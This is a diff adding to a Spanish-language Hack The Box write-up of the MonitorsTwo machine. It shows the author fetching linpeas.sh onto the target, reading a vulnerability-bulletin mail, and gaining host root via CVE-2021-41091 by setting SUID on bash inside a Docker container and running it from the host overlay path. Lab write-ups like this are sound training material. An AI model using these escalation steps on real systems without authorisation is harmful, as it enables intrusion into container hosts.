@@ -192,7 +192,7 @@ Es importante tener en cuenta que GTFOBins se utiliza con fines legítimos en pr
 
 En resumen, al buscar en GTFOBins, encontramos una técnica específica que nos permitió obtener acceso de root en el contenedor. Esto nos brinda un mayor control y privilegios sobre el sistema en el que estábamos trabajando, lo que puede ser utilizado para realizar pruebas de seguridad y garantizar la protección del sistema en general.
  
- ## Intrusión(máquina principal)
+## Intrusión (Maquina Principal)
  
 En la raíz del sistema podemos encontrar un script en el que podremos leer un archivo SQL.
 
@@ -352,3 +352,84 @@ El objetivo de utilizar LinEnum es obtener una visión general de la configuraci
 
 Es importante destacar que el uso de herramientas como LinEnum debe realizarse de manera ética y legal, con el consentimiento adecuado del propietario del sistema y siguiendo las normativas y regulaciones pertinentes. El objetivo principal es mejorar la seguridad y protección del sistema, detectando y corrigiendo posibles vulnerabilidades antes de que puedan ser explotadas por atacantes malintencionados.
 
+```javascript
+marcus@monitorstwo:~$ wget http://10.10.14.94/linpeas.sh
+--2023-05-02 15:12:04--  http://10.10.14.94/linpeas.sh
+Connecting to 10.10.14.94:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 828058 (809K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                                    100%[=================================================================================================>] 808.65K  1.38MB/s    in 0.6s    
+
+2023-05-02 15:12:05 (1.38 MB/s) - ‘linpeas.sh’ saved [828058/828058]
+```
+## Escalda de privilegios (Maquina Principal)
+
+Encontramos estas dos rutas marcadas de color rojo, 
+
+```javascript
+╔══════════╣ Mails (limit 50)              
+     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/mail/marcus
+     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/spool/mail/marcus
+```
+
+Se trata de un mail en el que hablan de las vulnerabilidades encontradas y que deberían ser arregladas. En nuestro caso nos debemos fijar en la última. Se trata de una vulnerabilidad de Docker en la que podemos ejecutar comandos del contenedor en la máquina anfitriona.
+
+
+```javascript
+marcus@monitorstwo:~$ cat /var/mail/marcus
+From: administrator@monitorstwo.htb
+To: all@monitorstwo.htb
+Subject: Security Bulletin - Three Vulnerabilities to be Aware Of
+
+Dear all,
+
+We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.
+
+CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.
+
+CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.
+
+CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.
+
+We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.
+
+Best regards,
+
+Administrator
+CISO
+Monitor Two
+Security Team
+```
+Debemos antes, encontrar la ruta de los contenedores mediante el comando findmnt.
+
+```javascript
+├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+```
+En el contenedor, como root debemos poner la bash con permisos SUID.
+
+```javascript
+root@50bca5e748b0:/# chmod u+s /bin/bash 
+chmod u+s /bin/bash
+root@50bca5e748b0:/# ls -l /bin/bash 
+ls -l /bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+root@50bca5e748b0:/#
+```
+Y en la máquina principal ejecutamos la bash del contenedor para convertirnos en root.
+
+
+```javascript
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ls
+bin  boot  dev  entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ls -l bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 bin/bash
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ bin/bash -p
+bash-5.1# whoami
+root
+bash-5.1# cat /root/root.txt 
+b4######################3204
+bash-5.1# 
+```
+```
